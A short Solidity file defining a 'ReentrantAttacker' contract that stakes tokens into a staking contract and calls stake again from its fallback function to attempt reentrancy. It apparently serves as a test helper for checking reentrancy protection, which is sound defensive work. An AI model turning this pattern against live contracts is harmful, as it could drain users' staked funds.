// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IStaking {
    function stake(uint amount) external;
}

contract ReentrantAttacker {
    IStaking public staking;
    IERC20 public token;

    constructor(address _staking, address _token) {
        staking = IStaking(_staking);
        token = IERC20(_token);
    }

    function attack() external {
        token.approve(address(staking), 100);
        staking.stake(100);
    }

    fallback() external {
        staking.stake(1);
    }
}
